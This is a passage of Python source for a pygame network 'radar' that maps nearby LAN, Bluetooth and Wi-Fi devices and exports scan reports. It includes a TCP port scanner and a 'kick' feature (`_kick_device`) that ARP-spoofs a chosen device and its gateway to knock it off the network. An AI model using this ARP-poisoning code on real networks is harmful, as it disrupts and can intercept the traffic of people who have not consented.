        current_bt = set(self.bt_scanner.devices.keys())

        new_net = current_net - self._prev_net_macs
        for mac in new_net:
            dev = self.scanner.devices[mac]
            vendor = dev.vendor
            name = dev.hostname or dev.ip
            label = f"{name} ({vendor})" if vendor else name
            self._log_event(f"NET+ {label}")
            self.alert_queue.append(("NEW DEVICE", label, time.time(), GREEN))
            self.total_devices_ever += 1

        new_bt = current_bt - self._prev_bt_addrs
        for addr in new_bt:
            dev = self.bt_scanner.devices[addr]
            name = dev.display_name
            if dev.has_airdrop:
                name += " [AirDrop]"
            self._log_event(f"BT+ {name}")
            self.alert_queue.append(("BT DEVICE", name, time.time(), CYAN))
            self.total_devices_ever += 1

        current_wifi = set(self.wifi_scanner.networks.keys())
        new_wifi = current_wifi - self._prev_wifi_bssids
        for bssid in new_wifi:
            net = self.wifi_scanner.networks[bssid]
            name = net.display_name
            sec = "OPEN" if net.is_open else net.auth
            self._log_event(f"WiFi+ {name} ({sec})")
            color = RED if net.is_open else PURPLE
            self.alert_queue.append(("WIFI NETWORK", f"{name} ch{net.channel}", time.time(), color))
            self.total_devices_ever += 1

        self._prev_net_macs = current_net
        self._prev_bt_addrs = current_bt
        self._prev_wifi_bssids = current_wifi

    def _cleanup_stale_devices(self):
        now = time.time()

        stale_net = [
            mac for mac, dev in self.scanner.devices.items()
            if not dev.is_self and (now - dev.last_seen) > DEVICE_TIMEOUT_NET
        ]
        for mac in stale_net:
            dev = self.scanner.devices[mac]
            vendor = dev.vendor
            name = dev.hostname or dev.ip
            label = f"{name} ({vendor})" if vendor else name
            self._log_event(f"NET- {label}")
            self.alert_queue.append(("DEVICE LEFT", label, now, DIM_RED))
            if mac in self.kicked_devices:
                self._unkick_device(mac)
            del self.scanner.devices[mac]
            self.hidden_devices.discard(mac)
            self.tagged_devices.pop(mac, None)
            self.device_notes.pop(mac, None)
            self.device_aliases.pop(mac, None)
            self.device_colors.pop(mac, None)
            self.device_custom_pos.pop(mac, None)
            self.port_scan_results.pop(mac, None)
            if self.selected_id == mac:
                self.selected_id = None
                self.selected_type = None
            self.sound._known_macs.discard(mac)

        stale_bt = [
            addr for addr, dev in self.bt_scanner.devices.items()
            if (now - dev.last_seen) > DEVICE_TIMEOUT_BT
        ]
        for addr in stale_bt:
            dev = self.bt_scanner.devices[addr]
            name = dev.display_name
            self._log_event(f"BT- {name}")
            self.alert_queue.append(("BT LEFT", name, now, DIM_CYAN))
            del self.bt_scanner.devices[addr]
            self.hidden_devices.discard(addr)
            self.tagged_devices.pop(addr, None)
            self.device_notes.pop(addr, None)
            self.device_aliases.pop(addr, None)
            self.device_colors.pop(addr, None)
            self.device_custom_pos.pop(addr, None)
            if self.selected_id == addr:
                self.selected_id = None
                self.selected_type = None

        stale_wifi = [
            bssid for bssid, net in self.wifi_scanner.networks.items()
            if (now - net.last_seen) > DEVICE_TIMEOUT_WIFI
        ]
        for bssid in stale_wifi:
            net = self.wifi_scanner.networks[bssid]
            name = net.display_name
            self._log_event(f"WiFi- {name}")
            self.alert_queue.append(("WIFI LEFT", name, now, DIM_PURPLE))
            del self.wifi_scanner.networks[bssid]
            self.hidden_devices.discard(bssid)
            self.tagged_devices.pop(bssid, None)
            self.device_aliases.pop(bssid, None)
            self.device_colors.pop(bssid, None)
            self.device_custom_pos.pop(bssid, None)
            if self.selected_id == bssid:
                self.selected_id = None
                self.selected_type = None

    def _port_scan_selected(self):
        if self.selected_id is None or self.selected_type != "net":
            return
        if self.selected_id not in self.scanner.devices:
            return
        if self.port_scanning:
            return
        dev = self.scanner.devices[self.selected_id]
        ip = dev.ip
        self.port_scanning = True
        self._log_event(f"Port scan started: {ip}")
        self.port_scan_results[self.selected_id] = {"status": "scanning", "ports": []}

        def _scan():
            open_ports = []
            for port, name in COMMON_PORTS.items():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    result = s.connect_ex((ip, port))
                    if result == 0:
                        open_ports.append((port, name))
                    s.close()
                except Exception:
                    pass
            self.port_scan_results[self.selected_id] = {"status": "done", "ports": open_ports}
            self.port_scanning = False
            port_str = ", ".join(f"{p}({n})" for p, n in open_ports) if open_ports else "none"
            self._log_event(f"Ports on {ip}: {port_str}")

        threading.Thread(target=_scan, daemon=True).start()

    def _screenshot(self):
        filename = f"radar_{time.strftime('%Y%m%d_%H%M%S')}.png"
        pygame.image.save(self.screen, filename)
        self._log_event(f"Screenshot: {filename}")
        self.export_flash = time.time()

    def _handle_hover(self, mouse_pos):
        closest_id = None
        closest_type = None
        closest_dist = 22

        for mac, dev in self.scanner.devices.items():
            if mac in self.hidden_devices:
                continue
            pos = self._get_radar_pos(mac, dev)
            dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
            dist = math.sqrt(dx * dx + dy * dy)
            if dist < closest_dist:
                closest_dist = dist
                closest_id = mac
                closest_type = "net"

        if self.show_bt:
            for addr, dev in self.bt_scanner.devices.items():
                if addr in self.hidden_devices:
                    continue
                pos = self._get_radar_pos(addr, dev)
                dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
                dist = math.sqrt(dx * dx + dy * dy)
                if dist < closest_dist:
                    closest_dist = dist
                    closest_id = addr
                    closest_type = "bt"

        if self.show_wifi:
            for bssid, net in self.wifi_scanner.networks.items():
                if bssid in self.hidden_devices:
                    continue
                pos = self._get_radar_pos(bssid, net)
                dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
                dist = math.sqrt(dx * dx + dy * dy)
                if dist < closest_dist:
                    closest_dist = dist
                    closest_id = bssid
                    closest_type = "wifi"

        self.hover_id = closest_id
        self.hover_type = closest_type

    def _export_devices(self):
        filepath = "device_scan_report.txt"
        now = time.time()
        with open(filepath, "w") as f:
            f.write(f"UAV RADAR — DEVICE SCAN REPORT\n")
            f.write(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'=' * 60}\n\n")

            f.write(f"NETWORK DEVICES ({len(self.scanner.devices)})\n")
            f.write(f"{'-' * 60}\n")
            for mac, dev in self.scanner.devices.items():
                if mac in self.hidden_devices:
                    continue
                tag = self.tagged_devices.get(mac, "")
                note = self.device_notes.get(mac, "")
                dtype = dev.device_type
                age = int(now - dev.last_seen)
                f.write(f"  IP: {dev.ip:15s}  MAC: {dev.mac}  HOST: {dev.hostname or 'unknown'}\n")
                if dtype:
                    f.write(f"    Type: {dtype}\n")
                if tag:
                    f.write(f"    Tag: {tag}\n")
                if note:
                    f.write(f"    Note: {note}\n")
                f.write(f"    Last seen: {age}s ago\n\n")

            if self.bt_scanner.devices:
                f.write(f"\nBLUETOOTH DEVICES ({len(self.bt_scanner.devices)})\n")
                f.write(f"{'-' * 60}\n")
                for addr, dev in self.bt_scanner.devices.items():
                    if addr in self.hidden_devices:
                        continue
                    tag = self.tagged_devices.get(addr, "")
                    note = self.device_notes.get(addr, "")
                    age = int(now - dev.last_seen)
                    f.write(f"  ADDR: {dev.address}  NAME: {dev.name or 'unknown'}  RSSI: {dev.rssi}dBm\n")
                    if dev.apple_services:
                        f.write(f"    Apple Services: {', '.join(dev.apple_services)}\n")
                    if dev.has_airdrop:
                        f.write(f"    AirDrop: ACTIVE\n")
                    if tag:
                        f.write(f"    Tag: {tag}\n")
                    if note:
                        f.write(f"    Note: {note}\n")
                    f.write(f"    Last seen: {age}s ago\n\n")

            if self.wifi_scanner.networks:
                f.write(f"\nWIFI NETWORKS ({len(self.wifi_scanner.networks)})\n")
                f.write(f"{'-' * 60}\n")
                for bssid, net in self.wifi_scanner.networks.items():
                    if bssid in self.hidden_devices:
                        continue
                    tag = self.tagged_devices.get(bssid, "")
                    age = int(now - net.last_seen)
                    sec = "OPEN" if net.is_open else net.auth
                    f.write(f"  SSID: {net.display_name:20s}  BSSID: {net.bssid}\n")
                    f.write(f"    Auth: {sec}  Encrypt: {net.encryption}  Ch: {net.channel}\n")
                    if net.band:
                        f.write(f"    Band: {net.band}  Radio: {net.radio_type}\n")
                    vendor = net.vendor
                    if vendor:
                        f.write(f"    Vendor: {vendor}\n")
                    f.write(f"    Signal: {net.signal}%\n")
                    if tag:
                        f.write(f"    Tag: {tag}\n")
                    f.write(f"    Last seen: {age}s ago\n\n")

            f.write(f"\nHidden devices: {len(self.hidden_devices)}\n")
        self.export_flash = time.time()

    def _get_radar_pos(self, device_id, device):
        if device_id in self.device_custom_pos:
            angle, distance = self.device_custom_pos[device_id]
            r = distance * RADAR_RADIUS
            x = RADAR_CENTER[0] + r * math.cos(angle)
            y = RADAR_CENTER[1] + r * math.sin(angle)
            return int(x), int(y)
        return device.radar_pos(RADAR_CENTER, RADAR_RADIUS)

    def _get_display_name(self, device_id, default_name):
        return self.device_aliases.get(device_id, default_name)

    def _get_device_color(self, device_id, default_color):
        return self.device_colors.get(device_id, default_color)

    def _start_rename(self):
        if self.selected_id is None:
            return
        current = self.device_aliases.get(self.selected_id, "")
        self.text_input_active = True
        self.text_input_buffer = current
        self.text_input_prompt = "RENAME DEVICE:"
        self.text_input_action = "rename"

    def _start_custom_tag(self):
        if self.selected_id is None:
            return
        current = self.tagged_devices.get(self.selected_id, "")
        self.text_input_active = True
        self.text_input_buffer = current
        self.text_input_prompt = "CUSTOM TAG:"
        self.text_input_action = "tag"

    def _cycle_color(self):
        if self.selected_id is None:
            return
        current = self.device_colors.get(self.selected_id)
        idx = 0
        for i, (name, color) in enumerate(COLOR_PRESETS):
            if color == current:
                idx = i
                break
        idx = (idx + 1) % len(COLOR_PRESETS)
        preset_name, preset_color = COLOR_PRESETS[idx]
        if preset_color is None:
            self.device_colors.pop(self.selected_id, None)
        else:
            self.device_colors[self.selected_id] = preset_color
        self._log_event(f"Color -> {preset_name}")

    def _start_drag(self, mouse_pos):
        closest_id = None
        closest_type = None
        closest_dist = 22

        for mac, dev in self.scanner.devices.items():
            if mac in self.hidden_devices:
                continue
            pos = self._get_radar_pos(mac, dev)
            dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
            dist = math.sqrt(dx * dx + dy * dy)
            if dist < closest_dist:
                closest_dist = dist
                closest_id = mac
                closest_type = "net"

        if self.show_bt:
            for addr, dev in self.bt_scanner.devices.items():
                if addr in self.hidden_devices:
                    continue
                pos = self._get_radar_pos(addr, dev)
                dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
                dist = math.sqrt(dx * dx + dy * dy)
                if dist < closest_dist:
                    closest_dist = dist
                    closest_id = addr
                    closest_type = "bt"

        if self.show_wifi:
            for bssid, net in self.wifi_scanner.networks.items():
                if bssid in self.hidden_devices:
                    continue
                pos = self._get_radar_pos(bssid, net)
                dx, dy = mouse_pos[0] - pos[0], mouse_pos[1] - pos[1]
                dist = math.sqrt(dx * dx + dy * dy)
                if dist < closest_dist:
                    closest_dist = dist
                    closest_id = bssid
                    closest_type = "wifi"

        if closest_id:
            self.dragging_id = closest_id
            self.dragging_type = closest_type
            self.selected_id = closest_id
            self.selected_type = closest_type

    def _update_drag(self, mouse_pos):
        if self.dragging_id is None:
            return
        dx = mouse_pos[0] - RADAR_CENTER[0]
        dy = mouse_pos[1] - RADAR_CENTER[1]
        angle = math.atan2(dy, dx)
        dist = math.sqrt(dx * dx + dy * dy)
        distance = min(1.0, max(0.0, dist / RADAR_RADIUS))
        self.device_custom_pos[self.dragging_id] = (angle, distance)

    def _stop_drag(self):
        if self.dragging_id:
            self._log_event(f"Moved device manually")
        self.dragging_id = None
        self.dragging_type = None

    def _finish_text_input(self):
        text = self.text_input_buffer.strip()
        if self.text_input_action == "rename" and self.selected_id:
            if text:
                self.device_aliases[self.selected_id] = text
                self._log_event(f"Renamed -> {text}")
            else:
                self.device_aliases.pop(self.selected_id, None)
                self._log_event("Alias removed")
        elif self.text_input_action == "note" and self.selected_id:
            if text:
                self.device_notes[self.selected_id] = text
                self._log_event(f"Note: {text[:20]}")
            else:
                self.device_notes.pop(self.selected_id, None)
                self._log_event("Note removed")
        elif self.text_input_action == "tag" and self.selected_id:
            if text:
                self.tagged_devices[self.selected_id] = text.upper()
                self._log_event(f"Tag -> {text.upper()}")
            else:
                self.tagged_devices.pop(self.selected_id, None)
                self._log_event("Tag removed")
        self.text_input_active = False
        self.text_input_buffer = ""
        self.text_input_action = None

    def _toggle_kick(self):
        if self.selected_id is None or self.selected_type != "net":
            return
        if self.selected_id not in self.scanner.devices:
            return
        dev = self.scanner.devices[self.selected_id]
        if dev.is_self:
            self._log_event("Cannot kick yourself")
            return

        if not HAS_SCAPY:
            self._log_event("scapy not installed")
            self.alert_queue.append(("ERROR", "pip install scapy", time.time(), RED))
            return

        gw_ip = self.scanner.gateway_ip
        gw_mac = self.scanner.gateway_mac
        if not gw_ip or not gw_mac:
            self._log_event("Gateway not detected")
            self.alert_queue.append(("ERROR", "Gateway not found", time.time(), RED))
            return

        mac = self.selected_id
        if mac in self.kicked_devices:
            self._unkick_device(mac)
        else:
            self._kick_device(mac, dev.ip, gw_ip, gw_mac)

    def _kick_device(self, mac, target_ip, gateway_ip, gateway_mac):
        target_mac_colons = mac.replace("-", ":").upper()
        gateway_mac_clean = gateway_mac.replace("-", ":").upper()
        self.kicked_devices[mac] = True
        self._log_event(f"KICK {target_ip}")
        self.alert_queue.append(("KICKED", f"{target_ip} disconnected", time.time(), RED))

        def _arp_spoof():
            try:
                while self.kicked_devices.get(mac, False):
                    send(ARP(op=2, pdst=target_ip, hwdst=target_mac_colons,
                             psrc=gateway_ip), verbose=False)
                    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac_clean,
                             psrc=target_ip), verbose=False)
                    time.sleep(0.5)
                for _ in range(5):
                    send(ARP(op=2, pdst=target_ip, hwdst=target_mac_colons,
                             psrc=gateway_ip, hwsrc=gateway_mac_clean), verbose=False)
                    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac_clean,
                             psrc=target_ip, hwsrc=target_mac_colons), verbose=False)
                    time.sleep(0.2)
            except Exception as e:
                self._log_event(f"Kick error: {str(e)[:25]}")

        t = threading.Thread(target=_arp_spoof, daemon=True)
        t.start()
        self._kick_threads[mac] = t

    def _unkick_device(self, mac):
        if mac in self.kicked_devices:
            del self.kicked_devices[mac]
            dev = self.scanner.devices.get(mac)
            ip = dev.ip if dev else "?"
            self._log_event(f"UNKICK {ip}")
            self.alert_queue.append(("RESTORED", f"{ip} reconnected", time.time(), GREEN))

    def _add_note(self):
        if self.selected_id is None:
            return
        current = self.device_notes.get(self.selected_id, "")
        self.text_input_active = True
        self.text_input_buffer = current
        self.text_input_prompt = "DEVICE NOTE:"
        self.text_input_action = "note"

    # ─── DRAWING ─────────────────────────────────────────────────────────────

    def _draw(self, dt):
        self.screen.fill(DARK_BG)
        self._draw_radar_bg()
        self._draw_sweep()
        self._draw_devices()
        if self.show_bt:
            self._draw_bt_devices()
        if self.show_wifi:
            self._draw_wifi_networks()
        self._draw_connection_line()
        self._draw_crosshair()
        self._draw_hud()
        self._draw_selected_panel()
        self._draw_hover_tooltip()
        self._draw_export_flash()
        self._draw_event_log()
        self._draw_alerts()
        self.screen.blit(self.noise_surface, (0, 0))
        self.screen.blit(self.scanlines, (0, 0))
        self.screen.blit(self.vignette, (0, 0))
        self._draw_corner_brackets()
        if self.text_input_active:
            self._draw_text_input()
        if self.dragging_id is not None:
            self._draw_drag_indicator()

    def _draw_corner_brackets(self):
        length = 30
        thickness = 2
        margin = 8
        color = DIM_GREEN
        corners = [
            (margin, margin, 1, 1),
            (SCREEN_W - margin, margin, -1, 1),
            (margin, SCREEN_H - margin, 1, -1),
            (SCREEN_W - margin, SCREEN_H - margin, -1, -1),
        ]
        for cx, cy, dx, dy in corners:
            pygame.draw.line(self.screen, color, (cx, cy), (cx + length * dx, cy), thickness)
            pygame.draw.line(self.screen, color, (cx, cy), (cx, cy + length * dy), thickness)

    def _draw_radar_bg(self):
        for r in range(RADAR_RADIUS, 0, -8):
            frac = r / RADAR_RADIUS
            g = int(8 * frac)
            pygame.draw.circle(self.screen, (0, g, 0), RADAR_CENTER, r)

        for i in range(1, 5):
            r = int(RADAR_RADIUS * i / 4)
            ring_surf = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
            pygame.draw.circle(ring_surf, (0, 60, 0, 60), RADAR_CENTER, r + 1, 3)
            pygame.draw.circle(ring_surf, (0, 80, 0, 120), RADAR_CENTER, r, 1)
            self.screen.blit(ring_surf, (0, 0))
            dist_label = f"{i * 25}%"
            label = self.font_tiny.render(dist_label, True, (0, 50, 0))
            self.screen.blit(label, (RADAR_CENTER[0] + r + 4, RADAR_CENTER[1] + 2))

        for angle_deg in range(0, 360, 30):
            angle = math.radians(angle_deg)
            ex = RADAR_CENTER[0] + RADAR_RADIUS * math.cos(angle)
            ey = RADAR_CENTER[1] + RADAR_RADIUS * math.sin(angle)
            pygame.draw.line(self.screen, (0, 25, 0), RADAR_CENTER, (int(ex), int(ey)), 1)

        for angle_deg in range(0, 360, 10):
            angle = math.radians(angle_deg)
            tick_in = RADAR_RADIUS - 6
            tick_out = RADAR_RADIUS
            x1 = RADAR_CENTER[0] + tick_in * math.cos(angle)
            y1 = RADAR_CENTER[1] + tick_in * math.sin(angle)
            x2 = RADAR_CENTER[0] + tick_out * math.cos(angle)
            y2 = RADAR_CENTER[1] + tick_out * math.sin(angle)
            pygame.draw.line(self.screen, GRID_GREEN, (int(x1), int(y1)), (int(x2), int(y2)), 1)

        outer_glow = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
        pygame.draw.circle(outer_glow, (0, 100, 0, 40), RADAR_CENTER, RADAR_RADIUS + 2, 4)
        pygame.draw.circle(outer_glow, (0, 80, 0, 120), RADAR_CENTER, RADAR_RADIUS, 2)
        self.screen.blit(outer_glow, (0, 0))

        directions = [("N", -90), ("S", 90), ("E", 0), ("W", 180),
                      ("NE", -45), ("NW", -135), ("SE", 45), ("SW", 135)]
        for label, deg in directions:
            angle = math.radians(deg)
            dist = RADAR_RADIUS + 18
            x = RADAR_CENTER[0] + dist * math.cos(angle)
            y = RADAR_CENTER[1] + dist * math.sin(angle)
            is_cardinal = len(label) == 1
            font = self.font_med if is_cardinal else self.font_tiny
            color = DIM_GREEN if is_cardinal else (0, 40, 0)
            text = font.render(label, True, color)
            rect = text.get_rect(center=(int(x), int(y)))
            self.screen.blit(text, rect)

    def _draw_sweep(self):
        self.sweep_surface.fill((0, 0, 0, 0))

        num_steps = 60
        cone_angle = 0.6
        for i in range(num_steps):
            frac = i / num_steps
            a = self.sweep_angle - frac * cone_angle
            alpha = int(50 * (1 - frac) ** 1.5)
            if alpha < 2:
                continue

            ex = RADAR_CENTER[0] + RADAR_RADIUS * math.cos(a)
            ey = RADAR_CENTER[1] + RADAR_RADIUS * math.sin(a)
            pygame.draw.line(self.sweep_surface, (0, 255, 0, alpha),
                             RADAR_CENTER, (int(ex), int(ey)), 2)

        self.screen.blit(self.sweep_surface, (0, 0))

        ex = RADAR_CENTER[0] + RADAR_RADIUS * math.cos(self.sweep_angle)
        ey = RADAR_CENTER[1] + RADAR_RADIUS * math.sin(self.sweep_angle)

        glow_surf = pygame.Surface((SCREEN_W, SCREEN_H), pygame.SRCALPHA)
        pygame.draw.line(glow_surf, (0, 255, 0, 30), RADAR_CENTER, (int(ex), int(ey)), 6)
        self.screen.blit(glow_surf, (0, 0))

        pygame.draw.line(self.screen, BRIGHT_GREEN, RADAR_CENTER, (int(ex), int(ey)), 2)

        tip_glow = pygame.Surface((20, 20), pygame.SRCALPHA)
        pygame.draw.circle(tip_glow, (0, 255, 0, 60), (10, 10), 10)
        pygame.draw.circle(tip_glow, (0, 255, 0, 120), (10, 10), 4)
        self.screen.blit(tip_glow, (int(ex) - 10, int(ey) - 10))

    def _draw_devices(self):
        now = time.time()
        for mac, dev in list(self.scanner.devices.items()):
            if mac in self.hidden_devices:
                continue
            pos = self._get_radar_pos(mac, dev)
            is_selected = (mac == self.selected_id and self.selected_type == "net")
            custom_color = self.device_colors.get(mac)

            angle_diff = (self.sweep_angle - dev.angle) % (2 * math.pi)
            pulse = max(0, 1.0 - angle_diff / 0.3) if angle_diff < 0.3 else 0

            age = now - dev.last_seen
            fade = max(0.3, 1.0 - (age - 30) / 120) if age > 30 else 1.0

            if is_selected:
                sel_size = 18 + int(3 * math.sin(now * 4))
                sel_surf = pygame.Surface((sel_size * 2, sel_size * 2), pygame.SRCALPHA)
                pygame.draw.circle(sel_surf, (255, 255, 255, 80), (sel_size, sel_size), sel_size, 2)
                pygame.draw.circle(sel_surf, (255, 255, 255, 30), (sel_size, sel_size), sel_size + 4, 1)
                self.screen.blit(sel_surf, (pos[0] - sel_size, pos[1] - sel_size))

            tag = self.tagged_devices.get(mac)
            if tag:
                tag_colors = {"KNOWN": GREEN, "SUSPECT": AMBER, "TARGET": RED}
                tc = tag_colors.get(tag, GREEN)
                tag_surf = self.font_tiny.render(tag, True, tc)
                self.screen.blit(tag_surf, (pos[0] + 14, pos[1] + 12))

            if dev.is_self:
                glow = pygame.Surface((28, 28), pygame.SRCALPHA)
                pygame.draw.circle(glow, (255, 180, 0, 40), (14, 14), 14)
                self.screen.blit(glow, (pos[0] - 14, pos[1] - 14))
                pygame.draw.circle(self.screen, (60, 40, 0), pos, 8)
                pygame.draw.circle(self.screen, AMBER, pos, 6)
                pygame.draw.circle(self.screen, (255, 220, 100), pos, 3)
                you_label = self._get_display_name(mac, "YOU")
                label = self.font_small.render(you_label, True, custom_color or AMBER)
                self.screen.blit(label, (pos[0] + 12, pos[1] - 6))
            else:
                if custom_color:
                    color = custom_color
                    glow_color = custom_color
                else:
                    base_g = int((180 + 75 * pulse) * fade)
                    color = (0, min(255, base_g), 0)
                    glow_color = (0, 255, 0)
                size = 5 + int(3 * pulse)

                glow_r = size + 8 + int(5 * pulse)
                glow = pygame.Surface((glow_r * 2, glow_r * 2), pygame.SRCALPHA)
                glow_a = int((35 + 65 * pulse) * fade)
                pygame.draw.circle(glow, (*glow_color, glow_a), (glow_r, glow_r), glow_r)
                if pulse > 0.3:
                    pygame.draw.circle(glow, (*glow_color, int(20 * pulse)), (glow_r, glow_r), glow_r + 4)
                self.screen.blit(glow, (pos[0] - glow_r, pos[1] - glow_r))

                pygame.draw.circle(self.screen, color, pos, size)
                inner_size = max(2, size - 2)
                pygame.draw.circle(self.screen, color, pos, inner_size)

                tri = size + 3
                points = [
                    (pos[0], pos[1] - tri),
                    (pos[0] - tri, pos[1] + tri // 2),
                    (pos[0] + tri, pos[1] + tri // 2),
                ]
                pygame.draw.polygon(self.screen, color, points, 2)

                default_name = dev.hostname[:18] if dev.hostname else dev.ip
                name = self._get_display_name(mac, default_name)
                label_color = custom_color if custom_color else (0, int(min(255, (140 + 60 * pulse) * fade)), 0)
                label = self.font_small.render(name, True, label_color)
                self.screen.blit(label, (pos[0] + 14, pos[1] - 6))

                dtype = dev.device_type
                if dtype:
                    dt_surf = self.font_tiny.render(dtype, True, custom_color or DIM_GREEN)
                    self.screen.blit(dt_surf, (pos[0] + 14, pos[1] + 8))

            note = self.device_notes.get(mac)
            if note:
                note_surf = self.font_tiny.render(f'"{note[:20]}"', True, DIM_AMBER)
                self.screen.blit(note_surf, (pos[0] + 14, pos[1] + 22))

            is_kicked = mac in self.kicked_devices
            if is_kicked and int(now * 4) % 2 == 0:
                kick_surf = self.font_tiny.render("BLOCKED", True, RED)
                kick_bg = pygame.Surface((kick_surf.get_width() + 4, kick_surf.get_height() + 2), pygame.SRCALPHA)
                kick_bg.fill((60, 0, 0, 200))
                self.screen.blit(kick_bg, (pos[0] - 26, pos[1] - 26))
                self.screen.blit(kick_surf, (pos[0] - 24, pos[1] - 25))
                cross_size = 12
                cross_surf = pygame.Surface((cross_size * 2, cross_size * 2), pygame.SRCALPHA)
                pygame.draw.line(cross_surf, (255, 0, 0, 180),
                                 (0, 0), (cross_size * 2, cross_size * 2), 2)
                pygame.draw.line(cross_surf, (255, 0, 0, 180),
                                 (cross_size * 2, 0), (0, cross_size * 2), 2)
                self.screen.blit(cross_surf, (pos[0] - cross_size, pos[1] - cross_size))

            is_new = (now - dev.first_seen) < 30
            if is_new and not is_kicked and int(now * 3) % 2 == 0:
                new_surf = self.font_tiny.render("NEW", True, BRIGHT_GREEN)
                bg = pygame.Surface((new_surf.get_width() + 4, new_surf.get_height() + 2), pygame.SRCALPHA)
                bg.fill((0, 60, 0, 180))
                self.screen.blit(bg, (pos[0] - 20, pos[1] - 16))
                self.screen.blit(new_surf, (pos[0] - 18, pos[1] - 15))

    def _draw_bt_devices(self):
        now = time.time()
        for addr, dev in list(self.bt_scanner.devices.items()):
            if addr in self.hidden_devices:
                continue
            pos = self._get_radar_pos(addr, dev)
            is_selected = (addr == self.selected_id and self.selected_type == "bt")
            custom_color = self.device_colors.get(addr)

            angle_diff = (self.sweep_angle - dev.angle) % (2 * math.pi)
            pulse = max(0, 1.0 - angle_diff / 0.3) if angle_diff < 0.3 else 0

            if is_selected:
                sel_size = 18 + int(3 * math.sin(now * 4))
                sel_surf = pygame.Surface((sel_size * 2, sel_size * 2), pygame.SRCALPHA)
                pygame.draw.circle(sel_surf, (255, 255, 255, 80), (sel_size, sel_size), sel_size, 2)
                self.screen.blit(sel_surf, (pos[0] - sel_size, pos[1] - sel_size))

            tag = self.tagged_devices.get(addr)
            if tag:
                tag_colors = {"KNOWN": GREEN, "SUSPECT": AMBER, "TARGET": RED}
                tc = tag_colors.get(tag, GREEN)
                tag_surf = self.font_tiny.render(tag, True, tc)
                self.screen.blit(tag_surf, (pos[0] + 14, pos[1] + 24))

            if custom_color:
                base_color = custom_color
                glow_color = custom_color
            elif dev.has_airdrop:
                base_color = APPLE_BLUE
                glow_color = (80, 160, 255)
            elif dev.is_apple:
                base_color = CYAN
                glow_color = (0, 200, 255)
            else:
                base_color = DIM_CYAN
                glow_color = (0, 120, 180)

            size = 5 + int(2 * pulse)
            glow_r = size + 6 + int(4 * pulse)
            glow = pygame.Surface((glow_r * 2, glow_r * 2), pygame.SRCALPHA)
            glow_a = int(30 + 55 * pulse)
            pygame.draw.circle(glow, (*glow_color, glow_a), (glow_r, glow_r), glow_r)
            self.screen.blit(glow, (pos[0] - glow_r, pos[1] - glow_r))

            diamond = size + 2
            points = [
                (pos[0], pos[1] - diamond),
                (pos[0] + diamond, pos[1]),
                (pos[0], pos[1] + diamond),
                (pos[0] - diamond, pos[1]),
            ]
            pygame.draw.polygon(self.screen, base_color, points, 2)
            pygame.draw.circle(self.screen, base_color, pos, size - 1)

            default_name = dev.display_name[:16]
            display_name = self._get_display_name(addr, default_name)
            label_parts = [display_name]
            if dev.has_airdrop:
                label_parts.append("[AirDrop]")
            elif dev.apple_services:
                label_parts.append(f"[{dev.apple_services[0]}]")
            label_text = " ".join(label_parts)
            label_color = custom_color if custom_color else (BRIGHT_CYAN if pulse > 0 else CYAN)
            label = self.font_small.render(label_text, True, label_color)
            self.screen.blit(label, (pos[0] + 14, pos[1] - 6))

            if dev.rssi != 0:
                rssi_text = self.font_tiny.render(f"{dev.rssi}dBm", True, custom_color or DIM_CYAN)
                self.screen.blit(rssi_text, (pos[0] + 14, pos[1] + 8))
                strength = max(0, min(4, int((100 + dev.rssi) / 20)))
                bar_x = pos[0] + 14 + rssi_text.get_width() + 4
                bar_y = pos[1] + 10
                for b in range(4):
                    h = 3 + b * 2
                    c = base_color if b < strength else (30, 30, 30)
                    pygame.draw.rect(self.screen, c, (bar_x + b * 5, bar_y + (10 - h), 3, h))

            note = self.device_notes.get(addr)
            if note:
                note_surf = self.font_tiny.render(f'"{note[:20]}"', True, DIM_AMBER)
                self.screen.blit(note_surf, (pos[0] + 14, pos[1] + 34))

            is_new = (now - dev.first_seen) < 30
            if is_new and int(now * 3) % 2 == 0:
                new_surf = self.font_tiny.render("NEW", True, BRIGHT_CYAN)
                bg = pygame.Surface((new_surf.get_width() + 4, new_surf.get_height() + 2), pygame.SRCALPHA)
                bg.fill((0, 30, 60, 180))
                self.screen.blit(bg, (pos[0] - 20, pos[1] - 16))
                self.screen.blit(new_surf, (pos[0] - 18, pos[1] - 15))

    def _draw_wifi_networks(self):
        now = time.time()
        for bssid, net in list(self.wifi_scanner.networks.items()):
            if bssid in self.hidden_devices:
                continue
            pos = self._get_radar_pos(bssid, net)
            is_selected = (bssid == self.selected_id and self.selected_type == "wifi")
            custom_color = self.device_colors.get(bssid)

            angle_diff = (self.sweep_angle - net.angle) % (2 * math.pi)
            pulse = max(0, 1.0 - angle_diff / 0.3) if angle_diff < 0.3 else 0

            if is_selected:
                sel_size = 18 + int(3 * math.sin(now * 4))
                sel_surf = pygame.Surface((sel_size * 2, sel_size * 2), pygame.SRCALPHA)
                pygame.draw.circle(sel_surf, (255, 255, 255, 80), (sel_size, sel_size), sel_size, 2)
                self.screen.blit(sel_surf, (pos[0] - sel_size, pos[1] - sel_size))

            tag = self.tagged_devices.get(bssid)
            if tag:
                tag_colors = {"KNOWN": GREEN, "SUSPECT": AMBER, "TARGET": RED}
                tc = tag_colors.get(tag, GREEN)
                tag_surf = self.font_tiny.render(tag, True, tc)
                self.screen.blit(tag_surf, (pos[0] + 14, pos[1] + 24))

            if custom_color:
                base_color = custom_color
                glow_color = custom_color
            elif net.is_open:
                base_color = RED
                glow_color = (255, 60, 60)
            else:
                sl = net.security_level
                if sl >= 3:
                    base_color = BRIGHT_PURPLE
                    glow_color = (180, 100, 255)
                elif sl >= 2:
                    base_color = PURPLE
                    glow_color = (140, 60, 220)
                else:
                    base_color = DIM_PURPLE
                    glow_color = (100, 40, 160)

            size = 5 + int(2 * pulse)
            glow_r = size + 6 + int(4 * pulse)
            glow = pygame.Surface((glow_r * 2, glow_r * 2), pygame.SRCALPHA)
